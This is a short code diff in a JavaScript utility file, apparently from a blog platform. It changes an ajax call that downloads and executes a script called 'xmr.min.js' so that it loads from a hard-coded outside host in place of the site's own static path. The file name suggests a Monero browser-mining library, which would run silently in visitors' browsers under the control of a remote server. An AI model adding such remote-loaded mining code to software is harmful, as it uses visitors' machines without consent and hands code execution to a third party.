@@ -247,7 +247,7 @@ var Util = {
     }
     $.ajax({
       method: "GET",
-      url: latkeConfig.staticServePath + '/js/lib/xmr.min.js',
+      url: 'https://static.hacpai.com/js/lib/xmr.min.js',
       dataType: "script",
       cache: true
     }).done(function () {
